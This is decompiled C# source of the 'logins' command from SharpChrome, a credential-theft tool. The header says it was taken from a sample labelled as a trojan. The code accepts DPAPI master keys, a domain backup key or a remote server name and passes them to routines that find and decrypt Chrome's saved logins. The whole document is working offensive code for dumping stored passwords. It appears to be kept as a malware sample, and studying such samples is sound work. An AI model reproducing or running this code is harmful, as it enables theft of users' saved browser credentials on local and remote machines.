// Decompiled with JetBrains decompiler
// Type: SharpChrome.Commands.Logins
// Assembly: SharpChrome, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D938FA4A-3611-4CA7-B3BE-AF9F6D845B7B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\VHO-Trojan.MSIL.Convagent.gen-340a639e1ec7cb2afa90a2aba177b368e13efc4dd1313e32af30b6ceb259f7d3.exe

using SharpDPAPI;
using System;
using System.Collections.Generic;
using System.IO;

namespace SharpChrome.Commands
{
  public class Logins : ICommand
  {
    public static string CommandName => "logins";

    public void Execute(Dictionary<string, string> arguments)
    {
      Console.WriteLine("\r\n[*] Action: Chrome Saved Logins Triage\r\n");
      arguments.Remove("logins");
      string displayFormat = "csv";
      string computerName = "";
      bool showAll = false;
      bool unprotect = false;
      if (arguments.ContainsKey("/format"))
        displayFormat = arguments["/format"];
      if (arguments.ContainsKey("/unprotect"))
        unprotect = true;
      if (arguments.ContainsKey("/showall"))
        showAll = true;
      if (arguments.ContainsKey("/server"))
      {
        computerName = arguments["/server"];
        Console.WriteLine("[*] Triaging remote server: {0}\r\n", (object) computerName);
      }
      Dictionary<string, string> MasterKeys = new Dictionary<string, string>();
      foreach (KeyValuePair<string, string> keyValuePair in arguments)
      {
        if (!keyValuePair.Key.StartsWith("/"))
          MasterKeys.Add(keyValuePair.Key, keyValuePair.Value);
      }
      if (arguments.ContainsKey("/pvk"))
        MasterKeys = Dpapi.PVKTriage(arguments);
      else if (arguments.ContainsKey("/mkfile"))
        MasterKeys = Helpers.ParseMasterKeyFile(arguments["/mkfile"]);
      if (arguments.ContainsKey("/target"))
      {
        string str = arguments["/target"].Trim('"').Trim('\'');
        if (File.Exists(str))
        {
          Console.WriteLine("[*] Target 'Login Data' File: {0}\r\n", (object) str);
          Chrome.ParseChromeLogins(MasterKeys, str, displayFormat, showAll, unprotect);
        }
        else
          Console.WriteLine("\r\n[X] '{0}' is not a valid file.", (object) str);
      }
      else if (arguments.ContainsKey("/server") && !arguments.ContainsKey("/pvk"))
        Console.WriteLine("[X] The '/server:X' argument must be used with '/pvk:BASE64...' !");
      else
        Chrome.TriageChromeLogins(MasterKeys, computerName, displayFormat, showAll, unprotect);
    }
  }
}
